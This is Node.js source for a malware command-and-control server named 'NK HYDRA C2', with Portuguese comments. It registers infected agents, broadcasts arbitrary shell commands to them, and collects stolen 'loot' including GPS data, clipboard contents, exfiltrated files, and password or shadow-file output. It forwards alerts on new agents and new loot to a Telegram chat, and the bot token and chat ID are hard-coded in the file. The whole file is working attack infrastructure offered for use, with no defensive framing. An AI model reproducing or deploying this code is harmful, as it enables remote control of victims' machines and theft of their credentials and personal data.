// NK HYDRA C2 SERVER v8.0 (Heartbeat Edition)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

// --- TELEGRAM CONFIG (PREENCHA AQUI) ---
const TELEGRAM_BOT_TOKEN = '8356261319:AAENjkdH8RsFJchLRrhNJmexI6xlqR0hkzE'; 
const TELEGRAM_CHAT_ID = '-1002186646587';

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); 

// Initialize Bot if token present
let telegramBot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

const sendTelegram = (msg) => {
    if (telegramBot && TELEGRAM_CHAT_ID) {
        telegramBot.sendMessage(TELEGRAM_CHAT_ID, msg, { parse_mode: 'HTML' })
            .catch(e => console.error('[TG_ERR]', e.message));
    }
};

app.use(cors());
app.use(express.json());

let agents = new Map();
let loot = [];

// Helper to broadcast status
const broadcastStatus = () => {
    const count = agents.size;
    io.emit('status', { agents: count, active: true });
};

// 1. DASHBOARD
app.get('/', (req, res) => {
    const agentsList = Array.from(agents.values()).map(a => a.id + ' (' + a.ip + ')').join('<br>');
    res.send(`<h1>NK HYDRA C2 ONLINE</h1><p>Agents: ${agents.size}</p><div>${agentsList}</div>`);
});

// 2. SOCKET HANDLER
io.on('connection', (socket) => {
    
    // Broadcast status to new UI connections immediately
    broadcastStatus();

    // AGENT IDENTIFICATION
    socket.on('identify', ({ type, id, os, ip }) => {
        if (type === 'agent') {
            const agentInfo = { socketId: socket.id, id, os, ip: ip || socket.handshake.address };
            agents.set(id, agentInfo);
            
            console.log(`[+] AGENT ONLINE: ${id}`);
            const msg = `🔥 <b>NOVO AGENTE ONLINE!</b>
ID: <code>${id}</code>
IP: ${agentInfo.ip}
OS: ${os}`;
            sendTelegram(msg);
            
            io.emit('log', `[SYSTEM] NEW NODE: ${id}`);
            broadcastStatus();
        }
    });

    // LOG STREAMING (LOOT CHECK)
    socket.on('stream_log', (data) => {
        const { output, from, type } = data;
        
        // Critical Loot Types
        if (type === 'GPS_DATA' || type === 'CLIPBOARD_DATA' || type === 'FILE_EXFIL' || output.includes('password') || output.includes('shadow')) {
            const lootItem = { time: new Date().toISOString(), from, type, data: output };
            loot.unshift(lootItem);
            
            const msg = `💰 <b>NOVO LOOT!</b>
Agente: ${from}
Tipo: ${type}
Dados: <code>${String(output).substring(0, 200)}...</code>`;
            sendTelegram(msg);
        }
        
        io.emit('log', `[${from}] ${output}`);
    });

    // COMMAND HANDLING
    socket.on('cmd', (data) => {
        // Broadcast to all agents for now
        io.emit('exec', { cmd: data.cmd });
    });

    socket.on('disconnect', () => {
        let disconnectedId = null;
        agents.forEach((val, key) => {
            if (val.socketId === socket.id) {
                disconnectedId = key;
                agents.delete(key);
            }
        });
        if (disconnectedId) {
            console.log(`[-] AGENT OFFLINE: ${disconnectedId}`);
            sendTelegram(`💔 <b>AGENTE OFFLINE:</b> ${disconnectedId}`);
            io.emit('log', `[SYSTEM] NODE LOST: ${disconnectedId}`);
            broadcastStatus();
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK HYDRA C2 running on port ${PORT}`));